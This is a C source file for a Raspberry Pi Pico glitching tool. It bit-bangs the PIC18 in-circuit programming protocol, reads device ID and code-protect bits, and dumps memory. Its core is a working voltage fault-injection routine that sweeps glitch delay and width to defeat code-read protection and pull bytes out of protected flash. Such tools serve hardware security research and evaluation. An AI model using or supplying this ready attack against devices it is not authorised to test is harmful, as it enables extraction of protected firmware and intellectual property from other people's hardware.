/*
 * PIC18 (classic) target support for Raiden-Pico - ICSP code-protect bypass
 * via voltage fault injection. See pic18_target.h for the attack model and
 * the DS39592E programming spec references.
 *
 * ICSP framing (DS39592E Section 2): every transaction is a 4-bit command
 * (clocked MSB-first) followed by a 16-bit operand (clocked LSB-first). PGD is
 * latched by the target on the FALLING edge of PGC. For table reads the first
 * 8 operand clocks are dummy (programmer drives 0) and the data byte is shifted
 * OUT on the last 8 clocks, LSB-first.
 *
 * Built on raw GPIO (not swd.c) since ICSP is a different protocol. Inject
 * point: crowbar on VDD (PIN_GLITCH_OUT / GP2).
 */

#include "pic18_target.h"
#include "glitch.h"
#include "platform.h"
#include "config.h"
#include "uart_cli.h"
#include "pico/stdlib.h"
#include "pico/time.h"
#include <stdio.h>

// Target power control lives in target_uart.c
extern void target_power_on(void);
extern void target_power_off(void);

// ICSP bit period. Spec minimum is ~100ns; 1us is comfortably slow and is the
// figure to tighten once the link is scope-verified.
#define ICSP_DLY() busy_wait_us(1)

// ---------------------------------------------------------------------------
// Low-level ICSP bit-bang
// ---------------------------------------------------------------------------
static inline void pgc(bool v) { gpio_put(PIC_PGC_PIN, v); }
static inline void pgd(bool v) { gpio_put(PIC_PGD_PIN, v); }

static void icsp_pins_out(void)
{
    gpio_init(PIC_PGC_PIN); gpio_set_dir(PIC_PGC_PIN, GPIO_OUT); pgc(0);
    gpio_init(PIC_PGD_PIN); gpio_set_dir(PIC_PGD_PIN, GPIO_OUT); pgd(0);
}

// Clock out one bit (PGD set, rise PGC, fall PGC -> target latches on falling).
static inline void icsp_clock_out(bool bit)
{
    pgd(bit);
    pgc(1); ICSP_DLY();
    pgc(0); ICSP_DLY();
}

// Clock the 4-bit command, MSB-first (DS39592E Table 2-4).
static void icsp_cmd4(uint8_t cmd)
{
    gpio_set_dir(PIC_PGD_PIN, GPIO_OUT);
    for (int i = 3; i >= 0; i--)
        icsp_clock_out((cmd >> i) & 1u);
}

// Clock out a 16-bit operand, LSB-first.
static void icsp_operand_out(uint16_t val)
{
    gpio_set_dir(PIC_PGD_PIN, GPIO_OUT);
    for (int i = 0; i < 16; i++) {
        icsp_clock_out(val & 1u);
        val >>= 1;
    }
}

// Full transaction: 4-bit command + 16-bit operand.
static void icsp_xfer(uint8_t cmd, uint16_t operand)
{
    icsp_cmd4(cmd);
    icsp_operand_out(operand);
}

// Execute a single 16-bit PIC18 core instruction in the target pipeline.
static void icsp_core(uint16_t insn) { icsp_xfer(ICSP_CORE_INST, insn); }

// Read one byte at the current TBLPTR via table-read-post-increment (0x9).
// Command clocks out, then 8 dummy clocks, then the data byte is read LSB-first
// on the final 8 clocks. This per-bit window is the glitch target on a
// protected block (the gating logic forces 0x00 unless faulted).
static uint8_t icsp_tblrd_postinc(void)
{
    icsp_cmd4(ICSP_TBLRD_POSTINC);

    // First 8 operand clocks: dummy, programmer drives the line low.
    gpio_set_dir(PIC_PGD_PIN, GPIO_OUT); pgd(0);
    for (int i = 0; i < 8; i++) {
        pgc(1); ICSP_DLY();
        pgc(0); ICSP_DLY();
    }

    // Last 8 clocks: release PGD, sample the data byte LSB-first.
    gpio_set_dir(PIC_PGD_PIN, GPIO_IN);
    uint8_t data = 0;
    for (int i = 0; i < 8; i++) {
        pgc(1); ICSP_DLY();
        if (gpio_get(PIC_PGD_PIN)) data |= (1u << i);
        pgc(0); ICSP_DLY();
    }
    return data;
}

// Point TBLPTR<20:0> at a byte address using core instructions:
//   MOVLW <byte>          (0x0E<kk>)
//   MOVWF TBLPTRU/H/L     (0x6EF8 / 0x6EF7 / 0x6EF6)
static void icsp_set_tblptr(uint32_t addr)
{
    icsp_core(0x0E00 | ((addr >> 16) & 0xFF)); icsp_core(0x6EF8); // -> TBLPTRU
    icsp_core(0x0E00 | ((addr >>  8) & 0xFF)); icsp_core(0x6EF7); // -> TBLPTRH
    icsp_core(0x0E00 | ( addr        & 0xFF)); icsp_core(0x6EF6); // -> TBLPTRL
}

// ---------------------------------------------------------------------------
// Connect / disconnect
// ---------------------------------------------------------------------------

// LVP entry method (see pic18_lvp_t). Defaults to the FX320 "MCHP" key sequence.
static pic18_lvp_t s_lvp_mode = PIC_LVP_MODE_KEY;

void pic18_set_lvp(pic18_lvp_t mode) { s_lvp_mode = mode; }

uint16_t pic18_connect(void)
{
    icsp_pins_out();

    // PGM is only meaningful for PGM-pin LVP, but always drive it to a defined
    // level so a connected F4321 isn't left floating: high to enter, low otherwise.
    gpio_init(PIC_PGM_PIN);
    gpio_set_dir(PIC_PGM_PIN, GPIO_OUT);
    gpio_put(PIC_PGM_PIN, 0);

    gpio_init(PIC_MCLR_PIN);
    gpio_set_dir(PIC_MCLR_PIN, GPIO_OUT);
    gpio_put(PIC_MCLR_PIN, 0);
    busy_wait_us(300);

    if (s_lvp_mode == PIC_LVP_MODE_PGM) {
        // PIC18F4321 family (DS39687): assert RB5/PGM high, then raise MCLR to
        // VDD. No key is clocked; PGM must stay high for the whole session.
        gpio_put(PIC_PGM_PIN, 1);
        busy_wait_us(10);
        gpio_put(PIC_MCLR_PIN, 1);
        busy_wait_us(40);
    } else {
        // FX220/X320 (DS39592E Section 5.3): raise MCLR to VDD, clock the 32-bit
        // "MCHP" key MSB-first while it is held, then let it settle.
        gpio_put(PIC_MCLR_PIN, 1);
        busy_wait_us(40);
        gpio_set_dir(PIC_PGD_PIN, GPIO_OUT);
        for (int i = 31; i >= 0; i--)
            icsp_clock_out((PIC_LVP_KEY >> i) & 1u);
        busy_wait_us(40);
    }

    // Read DEVID1:DEVID2 (low byte first via post-increment).
    icsp_set_tblptr(PIC_DEVID1_ADDR);
    uint8_t lo = icsp_tblrd_postinc();
    uint8_t hi = icsp_tblrd_postinc();
    return (uint16_t)((hi << 8) | lo);
}

void pic18_disconnect(void)
{
    gpio_init(PIC_MCLR_PIN);
    gpio_set_dir(PIC_MCLR_PIN, GPIO_OUT);
    gpio_put(PIC_MCLR_PIN, 0);
    gpio_init(PIC_PGM_PIN);
    gpio_set_dir(PIC_PGM_PIN, GPIO_OUT);
    gpio_put(PIC_PGM_PIN, 0);
    gpio_set_dir(PIC_PGD_PIN, GPIO_OUT); pgd(0);
    pgc(0);
}

// ---------------------------------------------------------------------------
// Info / protection state
// ---------------------------------------------------------------------------
bool pic18_is_protected(void)
{
    icsp_set_tblptr(PIC_CONFIG5L_ADDR);
    uint8_t cfg5l = icsp_tblrd_postinc();
    // Any CP bit == 0 means that block is protected.
    return (cfg5l & (PIC_CP0 | PIC_CP1 | PIC_CP2 | PIC_CP3)) !=
           (PIC_CP0 | PIC_CP1 | PIC_CP2 | PIC_CP3);
}

bool pic18_read_info(pic18_info_t *i)
{
    if (!i) return false;
    *i = (pic18_info_t){0};

    i->devid = pic18_connect();
    if (i->devid == 0 || i->devid == 0xFFFF) {
        i->state = 0;
        return false;
    }
    icsp_set_tblptr(PIC_CONFIG5L_ADDR);
    i->cfg5l = icsp_tblrd_postinc();
    bool protectedp = (i->cfg5l & (PIC_CP0 | PIC_CP1 | PIC_CP2 | PIC_CP3)) !=
                      (PIC_CP0 | PIC_CP1 | PIC_CP2 | PIC_CP3);
    i->state = protectedp ? 1 : 2;
    return true;
}

void pic18_cmd_info(void)
{
    pic18_info_t i;
    bool ok = pic18_read_info(&i);

    uart_cli_send("=== PIC18 Info ===\r\n");
    if (!ok) {
        uart_cli_send("ICSP:         NOT CONNECTED (no DEVID)\r\n");
        pic18_disconnect();
        return;
    }
    uart_cli_printf("DEVID:        0x%04X\r\n", (unsigned)i.devid);
    uart_cli_printf("CONFIG5L:     0x%02X\r\n", (unsigned)i.cfg5l);
    uart_cli_printf("Code protect: CP0=%c CP1=%c CP2=%c CP3=%c\r\n",
                    (i.cfg5l & PIC_CP0) ? '-' : 'P',
                    (i.cfg5l & PIC_CP1) ? '-' : 'P',
                    (i.cfg5l & PIC_CP2) ? '-' : 'P',
                    (i.cfg5l & PIC_CP3) ? '-' : 'P');
    uart_cli_printf("State:        %s\r\n",
                    i.state == 2 ? "READABLE (no protection)" : "PROTECTED");
    pic18_disconnect();
}

// ---------------------------------------------------------------------------
// Memory dump
// ---------------------------------------------------------------------------
uint32_t pic18_dump_mem(uint32_t addr, uint32_t bytes)
{
    icsp_set_tblptr(addr);
    uint32_t done = 0;
    char line[80];

    while (done < bytes) {
        uint32_t row = (bytes - done < 16) ? (bytes - done) : 16;
        int n = snprintf(line, sizeof(line), "0x%06X:", (unsigned)(addr + done));
        for (uint32_t k = 0; k < row; k++) {
            uint8_t b = icsp_tblrd_postinc();
            n += snprintf(line + n, sizeof(line) - n, " %02X", b);
        }
        snprintf(line + n, sizeof(line) - n, "\r\n");
        uart_cli_send(line);
        done += row;
    }
    return done;
}

// ---------------------------------------------------------------------------
// Glitch
// ---------------------------------------------------------------------------
static uint32_t pic18_clamp_width(uint32_t w)
{
    if (w < PIC_GLITCH_WIDTH_MIN_CYC) w = PIC_GLITCH_WIDTH_MIN_CYC;
    if (w > PIC_GLITCH_WIDTH_MAX_CYC) w = PIC_GLITCH_WIDTH_MAX_CYC;
    return w;
}

void pic18_glitch_shot(uint32_t delay_us, uint32_t width_cyc)
{
    platform_set_type(PLATFORM_CROWBAR);
    glitch_set_width(pic18_clamp_width(width_cyc));

    pic18_disconnect();
    target_power_off();
    sleep_ms(50);
    target_power_on();

    busy_wait_us(delay_us);
    glitch_arm();
    glitch_execute();   // pulses PIN_GLITCH_OUT (GP2) + GP22 GLITCH_FIRED marker

    uart_cli_printf("PIC18 shot: delay=%u us width=%u cyc (scope GP22 / probe VDD)\r\n",
                    (unsigned)delay_us, (unsigned)pic18_clamp_width(width_cyc));
}

bool pic18_glitch_cp(uint32_t delay_start_us, uint32_t delay_end_us,
                     uint32_t delay_step_us, uint32_t width_start_cyc,
                     uint32_t width_end_cyc, uint32_t width_step_cyc,
                     uint32_t probe_addr, uint32_t power_off_ms,
                     uint32_t settle_ms, uint32_t max_attempts)
{
    if (delay_step_us == 0) delay_step_us = 1;
    if (delay_end_us < delay_start_us) delay_end_us = delay_start_us;
    width_start_cyc = pic18_clamp_width(width_start_cyc);
    width_end_cyc   = pic18_clamp_width(width_end_cyc);
    if (width_end_cyc < width_start_cyc) width_end_cyc = width_start_cyc;
    if (width_step_cyc == 0) width_step_cyc = 1;

    platform_set_type(PLATFORM_CROWBAR);

    uart_cli_send("=== PIC18 CP-bypass glitch (delay x width sweep) ===\r\n");
    uart_cli_printf("delay %u..%u us step %u | width %u..%u cyc step %u | "
                    "probe 0x%06X | off %u ms | settle %u ms | max %u\r\n",
                    (unsigned)delay_start_us, (unsigned)delay_end_us, (unsigned)delay_step_us,
                    (unsigned)width_start_cyc, (unsigned)width_end_cyc, (unsigned)width_step_cyc,
                    (unsigned)probe_addr, (unsigned)power_off_ms, (unsigned)settle_ms,
                    (unsigned)max_attempts);
    uart_cli_send("Crowbar on GP2 -> VDD. Width inner / delay outer. Power-cycle Pico to abort.\r\n");

    uint32_t delay_us = delay_start_us;
    uint32_t width    = width_start_cyc;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        glitch_set_width(width);

        // --- power cycle the target ---
        pic18_disconnect();
        target_power_off();
        sleep_ms(power_off_ms);
        target_power_on();
        sleep_ms(settle_ms);

        // --- re-enter ICSP and aim TBLPTR at the protected probe address ---
        uint16_t devid = pic18_connect();
        if (devid == 0 || devid == 0xFFFF) {
            // Lost the link this cycle - skip (counts toward max_attempts).
            goto advance;
        }
        icsp_set_tblptr(probe_addr);

        // --- arm + fire the crowbar `delay_us` into the table-read clock-out ---
        busy_wait_us(delay_us);
        glitch_arm();
        glitch_execute();
        uint8_t b = icsp_tblrd_postinc();   // normally 0x00 on a protected block

        if (b != 0x00) {
            uart_cli_printf("\r\n*** CP BYPASS on attempt %u (delay=%u us, width=%u cyc): "
                            "read 0x%02X at 0x%06X ***\r\n", (unsigned)attempt,
                            (unsigned)delay_us, (unsigned)width, b, (unsigned)probe_addr);
            return true;
        }

advance:
        if ((attempt % 256) == 0) {
            uart_cli_printf("  attempt %u/%u  delay=%u us  width=%u cyc\r\n",
                            (unsigned)attempt, (unsigned)max_attempts,
                            (unsigned)delay_us, (unsigned)width);
        }

        // Width inner / delay outer.
        width += width_step_cyc;
        if (width > width_end_cyc) {
            width = width_start_cyc;
            delay_us += delay_step_us;
            if (delay_us > delay_end_us)
                delay_us = delay_start_us;
        }
    }

    uart_cli_send("PIC18 CP glitch: exhausted attempts, no bypass\r\n");
    pic18_disconnect();
    return false;
}
